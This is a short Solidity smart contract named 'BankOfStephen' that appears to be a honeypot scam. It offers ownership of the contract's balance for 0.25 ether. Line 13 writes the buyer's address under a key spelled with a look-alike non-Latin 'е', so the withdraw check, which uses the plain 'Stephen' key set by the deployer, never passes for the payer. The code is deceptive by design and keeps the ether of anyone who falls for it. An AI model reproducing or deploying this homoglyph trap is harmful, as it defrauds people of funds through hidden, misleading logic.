1 pragma solidity ^0.4.24;
2 
3 contract BankOfStephen{
4 
5 mapping(bytes32 => address) private owner;
6 
7 constructor() public{
8     owner['Stephen'] = msg.sender;
9 }
10 
11 function becomeOwner() public payable{
12     require(msg.value >= 0.25 ether);        
13     owner['Stephеn'] = msg.sender; 
14 }
15 
16 function withdraw() public{
17     require(owner['Stephen'] == msg.sender);
18     msg.sender.transfer(address(this).balance);
19 }
20 
21 function() public payable {}
22 
23 }